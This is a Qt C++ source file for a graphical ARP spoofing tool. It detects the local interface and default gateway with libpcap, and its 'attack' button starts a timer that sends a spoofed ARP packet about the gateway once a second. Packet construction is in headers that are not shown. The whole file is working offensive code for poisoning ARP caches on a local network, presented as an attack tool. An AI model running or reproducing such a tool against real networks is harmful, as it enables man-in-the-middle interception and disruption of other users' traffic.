#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <net/if.h>
#include <sys/ioctl.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <pcap.h>
#include <QTimer>
#include "function.h"
#include "parse.h"
#include "rt_parse.h"
#include "arp_attack.h"

uint32_t ip;
uint32_t subnetmask;
uint8_t my_mac[6];
struct info iface_info;
int on = 1;

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    ui->attack_btn->setEnabled(0);
    ui->stop_btn->setEnabled(0);
    timer = new QTimer;
    timer->start();
    timer->setInterval(1000);

}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::on_check_btn_clicked()
{
    // Find available interface
    char error[PCAP_ERRBUF_SIZE];
    pcap_if_t* all_devs;
    char buf[1024];
    if(pcap_findalldevs(&all_devs, error) == -1) {
        sprintf(buf, "error in pcap_findalldevs(%s)\n", error);
        ui->interface_browser->append(QString::fromStdString(buf));
        return;
    }

    char auto_gateway_ip[20];
    char auto_iface_name[20];
    if(!get_gateway(auto_iface_name, auto_gateway_ip, 20)){
        sprintf(buf, "Can not autu find interface\n");
        ui->interface_browser->append(QString::fromStdString(buf));
        return;
    }
    QString auto_gateway_ip_, auto_iface_name_;
    auto_gateway_ip_.sprintf("%s",auto_gateway_ip);
    auto_iface_name_.sprintf("%s", auto_iface_name);
    ui->check_btn->setEnabled(0);

    while(all_devs != nullptr){
        iface_info.name = all_devs->name;
        iface_info.desc = all_devs->description;
        iface_info.dev = all_devs;
        for(pcap_addr_t* pa = all_devs->addresses; pa != nullptr; pa = pa->next) {
            sockaddr* addr = pa->addr;
            sockaddr_in* addr_in = reinterpret_cast<sockaddr_in*>(addr);
            if(addr != nullptr && addr->sa_family == AF_INET)
                iface_info.ip = addr_in->sin_addr.s_addr;

            addr = pa->netmask;
            addr_in = reinterpret_cast<sockaddr_in*>(addr);
            if(addr != nullptr && addr->sa_family == AF_INET) {
                iface_info.subnetmask = addr_in->sin_addr.s_addr;

            }
        }
        iface_info.ip_and_mask = iface_info.ip & iface_info.subnetmask;

        QString ch_ip, ch_subnet;

        all_devs = all_devs->next;
        ch_ip.sprintf("%d.%d.%d.%d", (iface_info.ip)&0xFF, (iface_info.ip>>8)&0xFF, (iface_info.ip>>16)&0xFF, (iface_info.ip>>24)&0xFF);
        ch_subnet.sprintf("%d.%d.%d.%d", (iface_info.subnetmask)&0xFF, (iface_info.subnetmask>>8)&0xFF, (iface_info.subnetmask>>16)&0xFF, (iface_info.subnetmask>>24)&0xFF);

        if(auto_iface_name_ == iface_info.name){
            iface_info.gateway = inet_addr(auto_gateway_ip_.toUtf8().constData());
            ui->interface_browser->append(iface_info.name);
            ui->interface_browser->append(ch_ip);
            ui->interface_browser->append(ch_subnet);
            ui->interface_browser->append(auto_gateway_ip_);
            break;
        }
    }
    ui->attack_btn->setEnabled(1);
}


void MainWindow::on_attack_btn_clicked()
{
    ui->interface_browser->setText("[*] Start attack");
    connect(timer, SIGNAL(timeout()), this, SLOT(send_attack_pkt()));
}

void MainWindow::send_attack_pkt(){
    char dev[10] = {0, };
    qsnprintf(dev, sizeof(iface_info.name), "%s", iface_info.name.toUtf8().constData());

    getAttackerMAC(dev, my_mac);

    unsigned char arp_spoofed_pkt[50] = {0, };
    ARP_Packet * arp_pkt = (ARP_Packet *)malloc(sizeof(ARP_Packet));

    make_arp_packet(iface_info.gateway, my_mac, arp_pkt);
    memcpy(arp_spoofed_pkt, arp_pkt, sizeof(*arp_pkt));
    ui->stop_btn->setEnabled(1);
    start_attack(arp_spoofed_pkt, dev);
    ui->interface_browser->append("[+] send spoofed packet");
}

void MainWindow::on_stop_btn_clicked()
{
    disconnect(timer, SIGNAL(timeout()), this, SLOT(send_attack_pkt()));
    ui->attack_btn->setEnabled(1);
    ui->stop_btn->setEnabled(0);
    ui->interface_browser->setText("[-] Stop attack");
}
